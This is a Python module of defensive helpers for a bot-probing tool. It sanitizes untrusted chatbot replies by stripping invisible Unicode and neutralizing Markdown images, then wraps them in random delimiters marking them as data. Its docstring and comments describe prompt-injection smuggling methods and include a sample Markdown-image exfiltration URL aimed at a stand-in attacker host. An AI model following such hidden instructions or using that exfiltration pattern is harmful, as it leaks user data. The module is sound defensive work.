"""Trust-boundary helpers — target replies and derived intel are untrusted.

The target bot (@HackingA0) controls every reply Locus classifies.  A reply can
carry hidden instructions (Unicode tag characters, zero-width and bidi control
characters, Markdown image exfiltration, embedded ``<SYSTEM>`` blocks) aimed at
poisoning the classifier, the memory or the next generated probe.

Per the 2026 indirect-prompt-injection literature, the fix is structural and
deterministic — no LLM cooperation required:

1. ``sanitize_untrusted`` strips invisible/format characters and neutralizes
   Markdown image syntax before untrusted text touches an LLM or storage.
2. ``wrap_untrusted`` applies Microsoft-style Spotlighting: the reply is delimited
   inside a random marker so the model treats it as DATA, not as instructions.

Everything here is pure string manipulation (no network, no model).
"""

from __future__ import annotations

import re
import secrets

# Invisible / format characters an attacker can smuggle instructions with.
# Includes: C0/C1 control chars, soft hyphen, zero-width space/joiner (ZWSP,
# ZWNJ, ZWJ), bidi controls (LRM/RLM/embedding), word-joiner + invisible
# operators, variation selectors, BOM/ZWNBSP, interlinear annotation anchors,
# and Unicode Tag characters U+E0000–U+E007F (Trend Micro / Keysight 2025).
_INVISIBLE_RE = re.compile(
    "[\\u0000-\\u0008\\u000B\\u000C\\u000E-\\u001F\\u007F"
    "\\u00AD\\u200B-\\u200F\\u202A-\\u202E\\u2060-\\u206F"
    "\\uFE00-\\uFE0F\\uFEFF\\uFFF9-\\uFFFB"
    "\\U000E0000-\\U000E007F]"
)

# Markdown image syntax is an exfiltration channel when a client auto-fetches
# images: ``![alt](https://attacker/collect?data=...)`` (EchoLeak, CVE-2025-32711).
_MARKDOWN_IMAGE_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MARKDOWN_IMAGE_REF_RE = re.compile(r"!\[[^\]]*\]\[[^\]]*\]")

# Any pre-existing Locus markers in the reply are dropped so the target cannot
# close our delimiter early and escape the Spotlighting wrapper.
_MARKER_RE = re.compile(r"</?UNTRUSTED_REPLY_[0-9a-f]+>", re.IGNORECASE)


def strip_invisible(text: str) -> str:
    """Remove invisible/format characters that hide instructions from humans."""
    return _INVISIBLE_RE.sub("", text)


def neutralize_markdown(text: str) -> str:
    """Replace Markdown image syntax with a harmless literal placeholder."""
    text = _MARKDOWN_IMAGE_RE.sub("[image]", text)
    text = _MARKDOWN_IMAGE_REF_RE.sub("[image]", text)
    return text


def sanitize_untrusted(text: str) -> str:
    """Deterministically clean untrusted content before it reaches an LLM or storage."""
    if not text:
        return text
    text = strip_invisible(text)
    text = neutralize_markdown(text)
    return text.strip()


def wrap_untrusted(text: str, tag: str = "UNTRUSTED_REPLY") -> str:
    """Wrap untrusted text in a random Spotlighting delimiter.

    The returned string tells the model the content is DATA to analyze, never
    instructions to follow.  Any pre-existing Locus markers in the text are
    removed first so the source cannot break out of the wrapper.
    """
    text = _MARKER_RE.sub("", text)
    token = secrets.token_hex(4)
    return f"<{tag}_{token}>\n{text}\n</{tag}_{token}>"
